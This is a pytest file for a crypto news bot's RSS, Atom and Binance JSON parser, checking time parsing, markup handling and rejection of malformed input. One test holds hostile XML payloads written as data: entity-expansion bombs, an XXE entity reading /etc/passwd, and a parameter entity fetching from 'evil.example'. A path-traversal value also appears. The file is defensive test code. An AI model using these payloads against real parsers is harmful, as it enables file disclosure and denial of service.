"""Spec 0046 ayrıştırma: kayıtlı örnekler, varlık reddi, bozuk XML/JSON, Binance şeması (AC-4)."""

import json
from datetime import UTC, datetime
from pathlib import Path

import pytest

from crytobot.news._parse import ParseError, parse_binance, parse_feed

FIXTURES = Path(__file__).parent / "fixtures"


def test_recorded_rss_samples() -> None:
    coindesk = parse_feed((FIXTURES / "coindesk.xml").read_bytes())
    assert len(coindesk) == 3
    # an empty <content:encoded/> falls back to the description
    assert coindesk[0].text.startswith("XRP tanked")
    assert coindesk[0].published == datetime(2026, 11, 15, 2, 50, 57, tzinfo=UTC)
    telegraph = parse_feed((FIXTURES / "cointelegraph.xml").read_bytes())
    assert len(telegraph) == 3
    assert telegraph[0].text.startswith('<p style="float:right;')  # HTML kept as given
    assert telegraph[0].link is not None and telegraph[0].link.endswith("rss_partner_inbound")


def test_recorded_atom_sample() -> None:
    entries = parse_feed((FIXTURES / "atom.xml").read_bytes())
    assert [entry.published for entry in entries] == [
        datetime(2026, 11, 15, 5, 30, tzinfo=UTC),  # published wins over updated, UTC
        datetime(2026, 11, 15, 7, 0, tzinfo=UTC),  # only updated
    ]
    assert entries[1].link == "https://example.org/haber/guncel"
    assert entries[1].text == "Yalnız özet var."


def test_recorded_binance_sample() -> None:
    items = parse_binance((FIXTURES / "binance.json").read_bytes())
    assert len(items) == 6
    assert items[0].item_id == "289917"
    assert items[0].text == ""


def test_atom_xhtml_content_kept_in_order_with_markup() -> None:
    """Review round 1 F-1: RFC 4287 `type="xhtml"` içerik belge sırasıyla, işaretlemesiyle."""
    body = (
        b'<feed xmlns="http://www.w3.org/2005/Atom"><entry><id>x</id><title>t</title>'
        b'<content type="xhtml"><div xmlns="http://www.w3.org/1999/xhtml">'
        b"Fiyat <b>yuzde 5</b> artti.</div></content></entry></feed>"
    )
    assert parse_feed(body)[0].text == "<div>Fiyat <b>yuzde 5</b> artti.</div>"


def test_rss_inline_elements_kept_escaped_text_stays_escaped() -> None:
    body = (
        b'<rss version="2.0"><channel><item><guid>a</guid><title>t</title><description>'
        b'Fiyat <b>x</b> &amp; y <a href="https://e.org/?a=1&amp;b=2">l</a></description>'
        b"</item></channel></rss>"
    )
    assert parse_feed(body)[0].text == (
        'Fiyat <b>x</b> &amp; y <a href="https://e.org/?a=1&amp;b=2">l</a>'
    )


def test_text_without_child_elements_unchanged() -> None:
    """CDATA ve kaçırılmış HTML eskisi gibi: metin olduğu gibi, yeniden kaçırılmaz."""
    body = (
        b'<rss version="2.0"><channel><item><guid>a</guid><title>A &amp; B</title>'
        b"<description><![CDATA[<p>x & y</p>]]></description></item></channel></rss>"
    )
    item = parse_feed(body)[0]
    assert (item.title, item.text) == ("A & B", "<p>x & y</p>")


@pytest.mark.parametrize(
    "value",
    ["Sun, 15 Nov 2026 02:50:57 -0000", "15/11/2026", "", "Sun, 15 Nov 2026 02:50:57"],
)
def test_unreadable_rss_time_is_none(value: str) -> None:
    item = f"<item><guid>a</guid><title>t</title><pubDate>{value}</pubDate></item>"
    body = f'<rss version="2.0"><channel>{item}</channel></rss>'
    assert parse_feed(body.encode())[0].published is None


@pytest.mark.parametrize(
    "body",
    [
        b'<?xml version="1.0"?><!DOCTYPE rss [<!ENTITY a "aaaa">]><rss><channel/></rss>',
        b'<!DOCTYPE rss [<!ENTITY a "x"><!ENTITY b "&a;&a;&a;&a;">]><rss>&b;</rss>',
        b'<!DOCTYPE rss [<!ENTITY ext SYSTEM "file:///etc/passwd">]><rss>&ext;</rss>',
        b'<!DOCTYPE rss [<!ENTITY % p SYSTEM "https://evil.example/p.dtd"> %p;]><rss/>',
        b'<!DOCTYPE rss [<!ENTITY u SYSTEM "x" NDATA png>]><rss/>',
    ],
)
def test_entity_declarations_rejected(body: bytes) -> None:
    with pytest.raises(ParseError) as error:
        parse_feed(body)
    assert error.value.name == "xml_entity"


def test_plain_doctype_accepted() -> None:
    body = b'<!DOCTYPE rss SYSTEM "http://my.netscape.com/publish/formats/rss-0.91.dtd"><rss><channel><item><guid>a</guid><title>t</title></item></channel></rss>'
    assert len(parse_feed(body)) == 1


@pytest.mark.parametrize(
    ("parse", "body", "name"),
    [
        (parse_feed, b"<rss><channel>", "bad_xml"),
        (parse_feed, b"not xml", "bad_xml"),
        (parse_feed, b"<rss>&nbsp;</rss>", "bad_xml"),
        (parse_feed, b"<html><body/></html>", "bad_schema"),
        (parse_feed, b"<rss/>", "bad_schema"),
        (parse_binance, b"{", "bad_json"),
        (parse_binance, b"\xff\xfe", "bad_json"),
        (parse_binance, b"[]", "bad_schema"),
        (parse_binance, b'{"data": {}}', "bad_schema"),
        (parse_binance, b'{"data": {"catalogs": [{"articles": [{"id": "1"}]}]}}', "bad_schema"),
        (parse_binance, b"[" * 100000, "bad_json"),
    ],
)
def test_bad_xml_and_json_rejected(parse: object, body: bytes, name: str) -> None:
    with pytest.raises(ParseError) as error:
        parse(body)  # type: ignore[operator]
    assert error.value.name == name


def _article(**changes: object) -> bytes:
    article: dict[str, object] = {"id": 1, "code": "abc123", "title": "t", "releaseDate": 0}
    article.update(changes)
    return json.dumps({"data": {"catalogs": [{"articles": [article]}]}}).encode()


@pytest.mark.parametrize(
    "changes",
    [
        {"id": True},
        {"code": "../x"},
        {"code": "a b"},
        {"code": 5},
        {"title": None},
        {"releaseDate": "0"},
    ],
)
def test_binance_schema_strict(changes: dict[str, object]) -> None:
    with pytest.raises(ParseError) as error:
        parse_binance(_article(**changes))
    assert error.value.name == "bad_schema"


def test_binance_missing_or_unreadable_release_is_unknown() -> None:
    assert parse_binance(_article(releaseDate=None))[0].published is None
    assert parse_binance(_article(releaseDate=10**30))[0].published is None
